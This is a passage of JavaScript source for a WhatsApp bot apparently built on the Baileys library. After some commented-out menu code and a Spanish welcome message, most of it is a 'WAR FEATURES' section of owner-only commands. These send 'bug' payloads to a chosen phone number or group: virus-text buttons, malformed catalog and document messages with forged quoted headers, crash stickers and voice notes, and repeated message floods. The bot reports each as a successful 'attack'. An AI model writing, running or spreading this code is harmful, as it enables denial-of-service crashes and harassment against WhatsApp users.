//     for (let i of commandFoodsanddrinksMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＴＩＴＬＥＳ 』\n`
//     for (let i of commandTitlesMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＮＡＴＵＲＥ 』\n`
//     for (let i of commandNatureMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＭＡＴＥＲＩＡＬＳ 』\n`
//     for (let i of commandMaterialsMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＴＯＯＬＳ 』\n`
//     for (let i of commandToolsMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＣＯＬＤ 』\n`
//     for (let i of commandColdMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＴＲＡＤＩＴＩＯＮＳ 』\n`
//     for (let i of commandTraditionsMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＬＯＧＯＳ 』\n`
//     for (let i of commandLogosMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＣＯＬＯＲＳ 』\n`
//     for (let i of commandColorsMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＶＩＲＴＵＡＬ 』\n`
//     for (let i of commandVirtualMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＨＯＲＲＯＲ 』\n`
//     for (let i of commandHorrorMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
//     teks += `║\n╚════════════════ • ◊` //\nPara obtener detalles sobre un comando escribe (comando + "--help"), se recomienda hacerlo antes de utilizarlo.`
// } else if (command === 'downloadmenu') {
//     unicorn = await getBuffer(picak + 'MENU: \nDOWNLOAD')
//     teks = `╔════════════════ • ◊\n║\n╠══『 ＤＯＷＮＬＯＡＤ ＭＥＤＩＡ 』\n`
//     for (let i of commandDL) teks += `╠═＃${i}\n`
//     teks += `║\n╚════════════════ • ◊` //\nPara obtener detalles sobre un comando escribe (comando + "--help"), se recomienda hacerlo antes de utilizarlo.`
// } else if (command === 'searchmenu') {
//     unicorn = await getBuffer(picak + 'MENU: \nSEARCH')
//     teks = `╔════════════════ • ◊\n║\n╠══『 ＳＥＡＲＣＨ ＣＯＮＴＥＮＴ 』\n`
//     for (let i of commandSR) teks += `╠═＃${i}\n`
//     teks += `║\n╚════════════════ • ◊` //\nPara obtener detalles sobre un comando escribe (comando + "--help"), se recomienda hacerlo antes de utilizarlo.`
// } else if (command === 'convertmenu') {
//     unicorn = await getBuffer(picak + 'MENU: \nCONVERT')
//     teks = `╔════════════════ • ◊\n║\n╠══『 ＴＥＸＴ 』\n`
//     for (let i of commandTextCV) teks += `╠═＃${i}\n`
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＳＴＩＣＫＥＲ 』\n`
//     for (let i of commandStickerCV) teks += `╠═＃${i}\n`
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＩＭＡＧＥ 』\n`
//     for (let i of commandImageCV) teks += `╠═＃${i}\n`
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＡＵＤＩＯ 』\n`
//     for (let i of commandAudioCV) teks += `╠═＃${i}\n`
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＶＩＤＥＯ 』\n`
//     for (let i of commandVideoCV) teks += `╠═＃${i}\n`
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＥＭＯＪＩ 』\n`
//     for (let i of commandEmojiCV) teks += `╠═＃${i}\n`
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＥＦＦＥＣＴ 』\n`
//     for (let i of commandEffectCV) teks += `╠═＃${i}\n`
//     teks += `║\n╚════════════════ • ◊` //\nPara obtener detalles sobre un comando escribe (comando + "--help"), se recomienda hacerlo antes de utilizarlo.`
// } else if (command === 'randomimagemenu') {   
//     unicorn = await getBuffer(picak + 'MENU: \nRANDOM IMAGE')
//     teks = `╔════════════════ • ◊\n║\n╠══『 ＬＯＶＥ 』\n`
//     for (let i of commandLoveRI) teks += `╠═＃${i}\n`
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＭＥＭＥ 』\n`
//     for (let i of commandMemeRI) teks += `╠═＃${i}\n`
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＡＮＩＭＡＬＳ 』\n`
//     for (let i of commandAnimalsRI) teks += `╠═＃${i}\n`
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＦＯＯＤＳ/ＤＲＩＮＫＳ 』\n`
//     for (let i of commandFoodanddrinksRI) teks += `╠═＃${i}\n`
//     teks += `║\n╠════════ • ◊\n║\n╠══『 ＡＮＩＭＥ 』\n`
//     for (let i of commandAnimeRI) teks += `╠═＃${i}\n`
//     teks += `║\n╚════════════════ • ◊` //\nPara obtener detalles sobre un comando escribe (comando + "--help"), se recomienda hacerlo antes de utilizarlo.`
// } else if (command === 'nsfwmenu') {
//     if (!m.isGroup) return replywarn(mess.group)
//     if (!isnsfw) return replywarn(mess.nsfw)
//     unicorn = await getBuffer(picak + 'MENU: \nNSFW 7w7')
//     teks = `╔════════════════ • ◊\n║\n╠══『 ＨＥＮＴＡＩ 』\n`
//     for (let i of commandHentaiNSFW) teks += `╠═＃${i}\n`
//     teks += `║\n╚════════════════ • ◊` //\nPara obtener detalles sobre un comando escribe (comando + "--help"), se recomienda hacerlo antes de utilizarlo.`
// }
    if (notButtons) return await SkyzeeBOT.sendImage(from, unicorn, teks, m)
    await SkyzeeBOT.send5ButImg(from, teks, `${botname}`,unicorn, [{"quickReplyButton": {"displayText": "＃ 𝐁𝐀𝐂𝐊","id": `${prefix}menu`}}] )
break

case 'registrationPhase':
if (from !== '5492996557871-1596940074@g.us') return
photo = getBuffer('./XeonMedia/image/')
teks =
`*_¿Nuevo integrante en la comunidad Skyzee?_*

Antes que nada, es necesario tener en cuenta las normas para evitar infraccionar dicho reglamento y recibir un baneo temporal o permanente.

Solo pedimos ponerle atención a nuestros aliniamientos y no dejarlas pasar, no te preocupes si incumples las reglas desde un principio, con los errores se aprende.

Si vas a entrar para hacerte el pelele, el graciosín del grupo o el ofendidito que está en desacuerdo con ciertos puntos: suerte. ✌`
buttons = [
    { "quickReplyButton": { "displayText": "＃ 𝐑𝐄𝐆𝐋𝐀𝐌𝐄𝐍𝐓𝐎", "id": `${prefix}rulesSkyzee` } },
    { "quickReplyButton": { "displayText": "＃ 𝐑𝐄𝐆𝐋𝐀𝐌𝐄𝐍𝐓𝐎", "id": `${prefix}rulesSkyzee` } }
]
await SkyzeeBOT.send5ButImg(from, teks, `${botname}`, photo, buttons)
break

case 'rulesSkyzee':
if (from !== '5492996557871-1596940074@g.us') return
photo = getBuffer('./XeonMedia/image/')
teks = `${fs.readFileSync('.//.json')}`
break

//----------------☣️WAR FEATURES☣️---------------\\
//Note: if you edit, features wont work!!!⚠️
case 'pcbut':
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
                    if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcbut 91xxxxxxxxxx`)
                 buttonvirus = [
                          {buttonId: 'xeon', buttonText: {displayText: xeonvirtex}, type: 1},
  {buttonId: 'xeon', buttonText: {displayText: xeonbutton}, type: 1},
  {buttonId: 'xeon', buttonText: {displayText: xeonvirtex}, type: 1}
]
                    buttonMsgX = {
                          text: author,
                          footerText: botname,
                          buttons: buttonvirus,
                          headerType: 1
                      }
                      SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, buttonMsgX)
                      reply(mess.success)
                    break
case 'pcstick':{
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcstick 91xxxxxxxxxx`)
xeonOP = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": botname, 
                "jpegThumbnail": xpicvirus
            } 
        } 
    }
 xeonsteker = fs.readFileSync('./XBug/xstick.webp')
SkyzeeBOT.sendImageAsSticker(`${text}@s.whatsapp.net`, xeonsteker, xeonOP, { packname: global.packname, author: global.author })
await reply(`Successfully bug sticker attacked ${text}@s.whatsapp.net`)
}
break
case 'pcvn':{
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcvn 91xxxxxxxxxx`)
xeonvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": botname, 
                "jpegThumbnail": xpicvirus
            } 
        } 
    }
 xaudio = fs.readFileSync('./XBug/fullChudaiBaazi.mp3')
 SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {audio: xaudio, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonvn})
await reply(`Successfully Bug Attacked The Number ${text}@s.whatsapp.net`)
}
break
case 'catalogbugxxx': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
const xeontalog = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
var xeonmess = await prepareWAMessageMedia({ image: xpicvirus }, { upload: SkyzeeBOT.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": xeonmess.imageMessage,
"productId": "99999999999999",
"title": `Xeon Ezy☣️ ${xeonbutton} ${xeonbutton}`,
"description": `Xeon Ezy☣️ ${xeonbutton} ${xeonbutton}`,
"currencyCode": "INR",
"footerText": botname,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": author,
"url": websitex
},
"businessOwnerJid": "916909137213@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: xeontalog })
SkyzeeBOT.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
	case 'vnbug':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
xeonyvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": botname, 
                "jpegThumbnail": xpicvirus
            } 
        } 
    }
 xeonyaud = fs.readFileSync('./XBug/fullChudaiBaazi.mp3')
 SkyzeeBOT.sendMessage(m.chat, {audio: xeonyaud, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonyvn})
 }
 }
break
	case 'docbug':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
SkyzeeBOT.sendMessage(m.chat, {document: xpicvirus},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `Xeon Ezy☣️${xeonbrutal(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
	}
}
}})
}
}
break
case 'pcslow': { 
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcmass 91xxxxxxxxxx`)
             xeonyh1 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            }
            break
case 'pcgcslow': {          
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx`)
             pmgcmassxeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            }
            break
         case 'gcslow':               
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
             gcmassxeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            reply(mess.success)
            break
                    case 'gcfast':               
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
             gcinfinitexeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            break
case 'pcfast':               
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcinfinite 91xxxxxxxxxx`)
             pcinfinitexeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
